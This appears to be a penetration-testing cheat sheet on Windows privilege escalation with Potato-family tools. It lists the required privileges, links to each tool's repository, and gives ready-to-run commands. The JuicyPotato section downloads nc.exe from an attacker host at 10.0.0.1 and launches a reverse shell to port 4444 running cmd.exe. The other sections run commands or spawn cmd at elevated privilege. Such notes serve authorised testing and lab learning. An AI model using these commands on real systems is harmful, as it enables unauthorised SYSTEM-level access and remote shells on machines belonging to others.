---
title: Windows PrivEsc with LocalPotato
description:
tags:
    - Privilege Escalation
    - Windows
refs:
    - https://jlajara.gitlab.io/Potatoes_Windows_Privesc
    - https://github.com/decoder-it/LocalPotato
    - https://www.localpotato.com/localpotato_html/LocalPotato.html
    - https://tryhackme.com/room/localpotato
    - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
    - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
date: 2024-03-08
draft: false
---

## EfsPotato

### Required Privilege

- `SeImpersonatePrivilege`

### Payloads

- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)

```bash
EfsPotato "cmd.exe /c whoami"
```

<br />

## GodPotato

### Required Privileges

- `SeImpersonatePrivilege`

### Payloads

- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

```bash
GodPotato -cmd "cmd /c whoami"
```

<br />

## JuicyPotato

### Required Privilege

- `SeImpersonatePrivilege` or `SeAssignPrimaryToken`

### Payloads

- [https://github.com/antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
- [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

Before exploiting, we need to upload **`nc.exe`** (it is available from [here](https://github.com/int0x33/nc.exe/)) to the target machine.

```powershell
Invoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\Temp\nc.exe
```

Next start a listener in local machine.

```bash
nc -lvnp 4444
```

Then execute **`JuicyPotato`** in target machine.

```powershell
JuicyPotatoNG.exe -t * -p "c:\Temp\nc.exe" -a "10.0.0.1 4444 -e cmd.exe"
```

<br />

## PrintSpoofer

### Required Privilege

- `SeImpersonatePrivilege`

### Payloads

- [https://github.com/dievus/printspoofer](https://github.com/dievus/printspoofer)

```bash
PrintSpoofer.exe -i -c cmd
```

<br />

## RoguePotato

### Required Privilege

- `SeImpersonatePrivilege`

### Payloads

- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)

<br />

## RottenPotato

### Required Privilege

- `SeImpersonatePrivilege`

### Payloads

- [https://github.com/breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)

